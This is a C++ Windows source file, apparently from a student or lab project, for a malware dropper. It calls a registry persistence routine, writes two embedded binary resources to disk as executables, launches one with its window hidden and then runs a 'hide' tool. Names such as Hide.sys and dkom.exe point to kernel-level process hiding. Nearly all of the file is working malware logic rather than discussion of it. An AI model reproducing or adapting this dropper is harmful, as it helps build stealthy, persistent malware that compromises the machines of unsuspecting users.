#define _CRT_SECURE_NO_DEPRECATE
#include <atlstr.h>
#include "resource.h"
#include "regOnWin.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	//persistence
	HMODULE h_mod;
	bool show = 0;
	char *	c_path[MAX_PATH];
	std::string appName = "main";
	//WinChange(show);
	h_mod = GetModuleHandleW(NULL);
	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);
	//bool success = RegOnWin(c_path);
	//if (success)
	//	printf("example on write Reg success!\n");
	//else
	//	printf("Oops, something wrong happened!\n");
	Persistence(appName); //don't uncomment this function on your physical machine

	std::string sysName = "Hide.sys";
	std::string dkomName = "dkom.exe";
	
	HRSRC hResInfo1 = FindResource(NULL, (LPCSTR)IDR_SSS1, "SSS");
	int ierr1 = GetLastError();

	if (NULL == hResInfo1)
	{
		int ierr1 = GetLastError();
		printf("error");
		return 0;
	}

	ULONG nResSize1 = SizeofResource(NULL, hResInfo1);  // Data size/length  
	HGLOBAL hG1 = LoadResource(NULL, hResInfo1);
	if (NULL == hG1 || nResSize1 <= 0)
	{
		printf("error");
		return 0;
	}
	ULONG NumberOfBytesWritten1 = 0;
	LPBYTE pData1 = (LPBYTE)LockResource(hG1);    // Data Ptr 
	HANDLE hFile1 = CreateFile("group9.exe", 0x10000000u, 1u, 0, 2u, 0x80u, 0);
	WriteFile(hFile1, pData1, nResSize1, &NumberOfBytesWritten1, 0);
	CloseHandle(hFile1);

	HRSRC hResInfo2 = FindResource(NULL, (LPCSTR)IDR_HHH1, "HHH");
	int ierr2 = GetLastError();

	if (NULL == hResInfo2)
	{
		int ierr2 = GetLastError();
		printf("error");
		return 0;
	}

	ULONG nResSize2 = SizeofResource(NULL, hResInfo2);  // Data size/length  
	HGLOBAL hG2 = LoadResource(NULL, hResInfo2);
	if (NULL == hG2 || nResSize2 <= 0)
	{
		printf("error");
		return 0;
	}
	ULONG NumberOfBytesWritten2 = 0;
	LPBYTE pData2 = (LPBYTE)LockResource(hG2);    // Data Ptr 
	HANDLE hFile2 = CreateFile("hide.exe", 0x10000000u, 1u, 0, 2u, 0x80u, 0);
	WriteFile(hFile2, pData2, nResSize2, &NumberOfBytesWritten2, 0);
	CloseHandle(hFile2);

	WinExec("group9.exe", SW_HIDE);
	Sleep(3000);
	system("hide.exe");
	system("hide.exe");
	//system("hide.exe");
	//system("hide.exe");

}